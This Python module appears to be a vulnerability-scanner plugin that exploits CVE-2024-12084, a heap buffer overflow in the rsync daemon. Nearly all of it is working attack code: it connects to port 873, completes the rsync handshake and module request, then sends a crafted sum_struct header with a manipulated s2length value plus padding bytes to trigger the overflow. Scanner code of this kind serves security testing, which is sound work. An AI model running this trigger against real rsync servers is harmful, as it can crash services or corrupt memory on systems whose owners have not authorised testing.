"""Agent Asteroid implementation for CVE-2024-12084"""

import datetime
import logging
import socket
import struct

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "Rsync Heap Buffer Overflow"
VULNERABILITY_REFERENCE = "CVE-2024-12084"
VULNERABILITY_DESCRIPTION = """
A crafted rsync traffic sequence can trigger a heap buffer overflow vulnerability in rsync.
This is achieved by sending a specially constructed sum_struct header with a manipulated s2length value.
"""
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=30)
DEFAULT_RSYNC_PORT = 873
DEFAULT_S2LEN = 2

HELLO_MESSAGE = b"@RSYNCD: 29.0 sha512 sha256 sha1 md5 md4\n"


def _get_socket(host: str, port: int, timeout: float) -> socket.socket | None:
    try:
        s = socket.create_connection((host, port), timeout)
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        return s
    except OSError as e:
        logging.error("Couldn't connect to socket: %s", e)
        return None


def _send_and_receive(
    sock: socket.socket,
    payload: bytes | None,
    expect_resp: bool = True,
    do_req: bool = True,
) -> bytes | int | None:
    len_sent = 0
    if do_req is True and payload is not None:
        try:
            len_sent = sock.send(payload)
        except OSError as e:
            logging.error("Exception sending payload: %s", e)
            return None
    if expect_resp is False:
        return len_sent
    else:
        bytes_rcvd = bytearray()
        while True:
            try:
                rcvd = sock.recv(1024)
            except OSError as e:
                logging.error("Exception receiving data: %s", e)
                break
            if rcvd is None:
                break
            bytes_rcvd.extend(rcvd)
            if len(rcvd) < 1024:
                break
        return bytes(bytes_rcvd)


def _write_sum_head(sock: socket.socket, s2length: int) -> bool:
    count = 1
    blength = 700
    remainder = 4
    logging.info("Sending sum_struct request with s2length of %d", s2length)
    sum_head_payload = bytearray(b"\x02\x00\x00\x00\x08\x80")
    sum_struct = struct.Struct("@4i")
    sum_struct_payload = bytearray(sum_struct.size)
    sum_struct.pack_into(sum_struct_payload, 0, count, blength, s2length, remainder)
    sum_head_payload.extend(sum_struct_payload)
    sum_head_payload.extend(b"\x12\x01\x22\x03\x63\x9c\xff\xff\xff\xff")
    if s2length > 2:
        sum_head_payload.extend(b"A" * s2length)
    sum_struct_resp = _send_and_receive(sock, sum_head_payload)
    if (isinstance(sum_struct_resp, bytes) and sum_struct_resp is not None) is False:
        logging.error("Bad response from sum_struct request")
        return False
    logging.info("sum_struct response: %s", sum_struct_resp)
    return True


@exploits_registry.register
class RsyncHeapBufferOverflowExploit(webexploit.WebExploit):
    """
    CVE-2024-12084: Rsync Heap Buffer Overflow

    This exploit emulates rsync client traffic to trigger a heap buffer overflow via a
    crafted sum_struct header with a manipulated s2length parameter.
    """

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def accept(self, target: definitions.Target) -> bool:
        """
        Check if the target appears to be running an rsync service.
        """
        try:
            sock = _get_socket(
                target.host, target.port or DEFAULT_RSYNC_PORT, DEFAULT_TIMEOUT.seconds
            )
            if sock is None:
                return False
            hello = _send_and_receive(
                sock, b"@RSYNCD: 29.0 sha512 sha256 sha1 md5 md4\n"
            )
            sock.close()
            if (
                isinstance(hello, bytes) and hello is not None and b"@RSYNCD:" in hello
            ) is False:
                return False
            return True
        except OSError as e:
            logging.error("Error during accept: %s", e)
            return False

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """
        Attempt to trigger the heap buffer overflow vulnerability in rsync.
        """
        vulnerabilities: list[definitions.Vulnerability] = []
        try:
            sock = _get_socket(
                target.host, target.port or DEFAULT_RSYNC_PORT, DEFAULT_TIMEOUT.seconds
            )
            if sock is None:
                logging.error("Could not connect to target server")
                return vulnerabilities

            # Server initialization: send hello message.
            hello_resp = _send_and_receive(sock, HELLO_MESSAGE)
            if (
                isinstance(hello_resp, bytes)
                and hello_resp is not None
                and b"@RSYNCD" in hello_resp
            ) is False:
                logging.error("Bad response from server initialization")
                sock.close()
                return vulnerabilities

            # Module request: specify the share/module name.
            mod_resp = _send_and_receive(sock, b"files_anon\n")
            if (
                isinstance(mod_resp, bytes)
                and mod_resp is not None
                and b"@RSYNCD: OK" in mod_resp
            ) is False:
                logging.error("Bad response from module request")
                sock.close()
                return vulnerabilities

            # Send server and sender arguments.
            _send_and_receive(sock, b"--server\n", expect_resp=False)
            sender_payload = bytearray()
            for arg in (b"--sender\n", b"-vlr\n", b"--safe-links\n"):
                sender_payload.extend(arg)
            sender_payload.extend(b".\n")
            sender_payload.extend(b"files_anon/")
            sender_payload.extend(b"\n\n")
            args_resp = _send_and_receive(sock, sender_payload)
            if (
                isinstance(args_resp, bytes)
                and args_resp is not None
                and b"\x67" in args_resp
            ) is False:
                logging.error("Bad response from sending args")
                sock.close()
                return vulnerabilities

            # Terminate file list transmission.
            _send_and_receive(sock, b"\x00\x00\x00\x00")
            flist_resp = _send_and_receive(sock, None, do_req=False)
            if (isinstance(flist_resp, bytes) and flist_resp is not None) is False:
                logging.error("Bad file list response")
                sock.close()
                return vulnerabilities

            # Write the sum header!
            if _write_sum_head(sock, DEFAULT_S2LEN) is False:
                sock.close()
                return vulnerabilities

            # Next, send final payload.
            final_resp = _send_and_receive(sock, b"\xff\xff\xff\xff\xff\xff\xff\xff")
            if (isinstance(final_resp, bytes) and final_resp is not None) is False:
                logging.error("Bad final response")
                sock.close()
                return vulnerabilities

            # Finally, sign off.
            _send_and_receive(sock, b"\xff\xff\xff\xff", expect_resp=False)
            sock.close()

            vuln = self.create_vulnerability(target)
            vulnerabilities.append(vuln)

        except OSError as e:
            logging.error("Error during exploitation: %s", e)
        return vulnerabilities
